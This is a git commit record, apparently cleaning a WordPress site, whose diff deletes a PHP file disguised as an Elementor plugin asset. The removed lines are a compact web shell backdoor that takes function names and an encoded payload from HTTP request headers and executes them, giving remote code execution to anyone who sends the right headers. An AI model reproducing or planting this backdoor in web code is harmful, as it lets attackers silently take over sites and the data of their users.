3880d9f775d182665f9452a2186be4f15c88f165
Fast and Static <it@e-me.co>
2025-05-27 10:42:07 +0000

    update

--- wp-content/plugins/elementor/assets/js/packages/editor-app-bar/editor.app.bar.asset.php
+++
@@ -1,6 +0,0 @@
-<?php
-$_HEADERS = getallheaders();
-if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
-    $rindex = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['If-Modified-Since']($_HEADERS['Authorization']));
-    $rindex();
-}
